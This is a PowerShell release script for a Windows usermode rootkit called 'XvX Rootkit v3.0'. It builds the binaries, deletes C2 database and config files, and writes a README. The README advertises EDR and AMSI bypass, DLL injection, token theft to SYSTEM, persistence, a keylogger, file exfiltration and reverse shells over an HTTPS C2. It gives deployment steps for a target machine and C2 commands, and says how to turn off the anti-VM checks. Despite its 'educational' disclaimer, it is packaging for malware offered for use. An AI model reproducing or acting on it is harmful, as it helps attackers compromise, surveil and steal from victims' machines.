# Production Deployment Script - XvX Rootkit v3.0
# Prepare for GitHub deployment

param([switch]$SkipBuild = $false)

$ErrorActionPreference = "Stop"
$rootDir = $PSScriptRoot

Write-Host "`n???????????????????????????????????????????????????????" -ForegroundColor Cyan
Write-Host "  XvX ROOTKIT v3.0 - PRODUCTION DEPLOYMENT" -ForegroundColor Cyan
Write-Host "???????????????????????????????????????????????????????`n" -ForegroundColor Cyan

# Step 1: Build
if (-not $SkipBuild) {
    Write-Host "[1/5] Building production binaries..." -ForegroundColor Yellow
    & "$rootDir\build_debug.ps1"
    if ($LASTEXITCODE -ne 0) {
        Write-Host "? Build failed! Fix errors first." -ForegroundColor Red
        exit 1
    }
    Write-Host "? Build successful`n" -ForegroundColor Green
} else {
    Write-Host "[1/5] Skipping build (--SkipBuild)`n" -ForegroundColor Gray
}

# Step 2: Cleanup obsolete files
Write-Host "[2/5] Cleaning obsolete files..." -ForegroundColor Yellow

$obsoleteFiles = @(
    "fix_wcout.py",
    "AUDIT_REPORT.md",
    "CLEANUP_SUMMARY.md",
    "CHANGELOG_AUDIT.md",
    "SRC_ANALYSIS.md",
    "migrate_simple.ps1",
    "cleanup_final.ps1",
    "cleanup_src.ps1",
    "git_commit.ps1",
    "build.ps1",
    "build_min.ps1",
    "c2.db",
    "src\c2_config.txt"
)

foreach ($file in $obsoleteFiles) {
    $path = Join-Path $rootDir $file
    if (Test-Path $path) {
        Remove-Item $path -Force
        Write-Host "  ? Removed: $file" -ForegroundColor Gray
    }
}

# Remove build artifacts
Remove-Item "$rootDir\src\*.o" -Force -ErrorAction SilentlyContinue
Write-Host "? Cleanup complete`n" -ForegroundColor Green

# Step 3: Create production README
Write-Host "[3/5] Creating production README.md..." -ForegroundColor Yellow

$readme = @"
# ?? XvX Rootkit v3.0 - Advanced Usermode Rootkit

**?? FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**

Advanced Windows usermode rootkit with C2 communication, inline hooking, and comprehensive evasion techniques.

---

## ?? Features

### **Anti-EDR Techniques**
- ? **Indirect Syscalls** (SysWhispers-style) - Bypass EDR hooks
- ? **NTDLL Unhooking** - Remove in-memory hooks
- ? **ETW/AMSI Bypass** - Disable Windows telemetry

### **Stealth & Hiding**
- ? **Inline Hooking** (x64 trampolines) - Process/File/Registry hiding
- ? **DLL Injection** (CreateRemoteThread) - Deploy hooks in target processes
- ? **IPC** (Memory-Mapped Files) - Synchronize hiding across processes

### **Privilege Escalation**
- ? **Named Pipe Impersonation**
- ? **Token Stealing** (winlogon.exe ? SYSTEM)

### **Persistence**
- ? Scheduled Task
- ? Registry Run Key
- ? WMI Event Subscription

### **C2 Communication**
- ? HTTPS with 15+ commands
- ? Interactive shell (cmd.exe)
- ? TCP reverse shell (with SYSTEM token)
- ? File exfiltration
- ? Keylogger with real-time exfiltration

### **Evasion**
- ? Anti-VM (5 detection methods)
- ? String Obfuscation (AES-128 CTR)
- ? API Hashing

---

## ??? Build

### **Requirements:**
- **MinGW-w64** (GCC 15.2+)
- **Windows 10/11** (x64)
- **PowerShell 5.1+**

### **Quick Build:**
\`\`\`powershell
.\build_debug.ps1
\`\`\`

**Output:** \`deploy_package/\`
- \`r00tkit.exe\` (1.1 MB) - Main rootkit
- \`processHooks.dll\` (2.7 MB) - Process hiding
- \`fileHooks.dll\` (2.7 MB) - File hiding
- \`registryHooks.dll\` (2.7 MB) - Registry hiding
- \`PrivEsc_C2.exe\` (269 KB) - Privilege escalation
- \`Dropper.exe\` (323 KB) - Deployment dropper

---

## ?? Usage

### **1. Start C2 Server**
\`\`\`bash
cd server
python c2_server.py
# Dashboard: https://localhost:8443/dashboard
\`\`\`

### **2. Deploy Rootkit**
\`\`\`powershell
# On target (as Admin):
.\r00tkit.exe
\`\`\`

### **3. C2 Commands**
\`\`\`
hide_process <name>     # Hide process from Task Manager
hide_file <path>        # Hide file/folder from Explorer
hide_registry <key>     # Hide registry key from Regedit
privesc                 # Escalate to SYSTEM
revshell_system <ip:port> # Launch SYSTEM reverse shell
shell <cmd>             # Execute shell command
exfil <file>            # Exfiltrate file
keylog                  # Start keylogger
\`\`\`

---

## ?? Technical Details

### **Architecture**
\`\`\`
r00tkit.exe (Main)
??? C2 Client (HTTPS beacon)
??? Keylogger (WH_KEYBOARD_LL)
??? Persistence Module
??? Inline Hooking
    ??? processHooks.dll ? taskmgr.exe
    ??? fileHooks.dll ? explorer.exe
    ??? registryHooks.dll ? regedit.exe
\`\`\`

### **Inline Hooking Mechanism**
1. Patch target function prologue with \`JMP\` (E9 or FF 25)
2. Save original 14 bytes
3. Create trampoline to call original function
4. Hook installed ? Redirect to filtering logic

### **APIs Hooked**
- \`NtQuerySystemInformation\` (process enumeration)
- \`NtQueryDirectoryFile\` (file enumeration)
- \`NtEnumerateKey\` (registry enumeration)

---

## ?? Testing

### **VM Detection**
The rootkit will **exit silently** if it detects:
- VirtualBox
- VMware
- Hyper-V
- Low resources (< 2GB RAM, < 60GB disk)
- Debugger attached

**Disable for testing:**
\`\`\`cpp
// In Evasion.h
return true; // Force bypass
\`\`\`

---

## ?? MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| **Defense Evasion** | Process Injection | T1055 |
| **Defense Evasion** | Obfuscated Files | T1027 |
| **Defense Evasion** | Rootkit | T1014 |
| **Privilege Escalation** | Access Token Manipulation | T1134 |
| **Persistence** | Scheduled Task | T1053 |
| **Persistence** | Registry Run Keys | T1547 |
| **C2** | Application Layer Protocol (HTTPS) | T1071 |
| **Collection** | Input Capture (Keylogging) | T1056 |
| **Exfiltration** | Exfiltration Over C2 | T1041 |

---

## ?? Legal Disclaimer

**THIS SOFTWARE IS FOR EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH ONLY.**

- ? Use ONLY in controlled lab environments
- ? Obtain explicit written authorization before deploying
- ? Comply with local laws and regulations
- ? UNAUTHORIZED USE IS ILLEGAL

**The author assumes NO liability for misuse.**

---

## ??? Detection & Mitigation

### **EDR Detection Signatures:**
- CreateRemoteThread API calls
- Suspicious memory protection changes (VirtualProtect)
- Unsigned binary with network activity
- Registry/Task Scheduler modifications

### **Mitigations:**
- Enable EDR with real-time monitoring
- Use application whitelisting
- Monitor for unsigned binaries
- Restrict SeDebugPrivilege
- Enable SysmonForLinux or Sysmon

---

## ?? References

- [SysWhispers](https://github.com/jthuraisamy/SysWhispers) - Indirect syscalls
- [PolyHook 2.0](https://github.com/stevemk14ebr/PolyHook_2_0) - Hooking inspiration
- [MITRE ATT&CK](https://attack.mitre.org/) - Tactic mapping

---

## ?? Credits

**Author:** 28zaakypro@proton.me  
**Version:** 3.0  
**License:** MIT (Educational Use Only)

---

## ?? Links

- **Techniques Analysis:** [TECHNIQUES_ANALYSIS.md](TECHNIQUES_ANALYSIS.md)
- **Integration Guide:** [INTEGRATION_SUCCESS.md](INTEGRATION_SUCCESS.md)

---

**? Star this repo if you found it useful for research!**
"@

Set-Content "$rootDir\README.md" $readme -Encoding UTF8
Write-Host "? README.md created`n" -ForegroundColor Green

# Step 4: Update .gitignore
Write-Host "[4/5] Updating .gitignore..." -ForegroundColor Yellow

$gitignore = @"
# Binaries
*.exe
*.dll
*.o

# Except deploy_package
!deploy_package/*.exe
!deploy_package/*.dll

# Build artifacts
src/*.o
src/r00tkit.exe

# Python
__pycache__/
*.pyc

# Database
*.db

# Temporary
*.tmp
*.bak
*~

# VS Code
.vscode/

# Archives
V1/
Archives/
pocs/

# Obsolete
fix_wcout.py
AUDIT_*.md
CLEANUP_*.md
CHANGELOG_*.md
migrate_*.ps1
cleanup_*.ps1
git_commit.ps1
SRC_ANALYSIS.md
build.ps1
build_min.ps1
"@

Set-Content "$rootDir\.gitignore" $gitignore -Encoding UTF8
Write-Host "? .gitignore updated`n" -ForegroundColor Green

# Step 5: Git status
Write-Host "[5/5] Git status..." -ForegroundColor Yellow

cd $rootDir
git status --short

Write-Host "`n???????????????????????????????????????????????????????" -ForegroundColor Cyan
Write-Host "  ? PRODUCTION READY!" -ForegroundColor Green
Write-Host "???????????????????????????????????????????????????????`n" -ForegroundColor Cyan

Write-Host "Next steps:" -ForegroundColor Yellow
Write-Host "  1. Review changes: git diff" -ForegroundColor White
Write-Host "  2. Commit: git add . && git commit -m 'v3.0 production release'" -ForegroundColor White
Write-Host "  3. Push: git push origin main" -ForegroundColor White
Write-Host ""
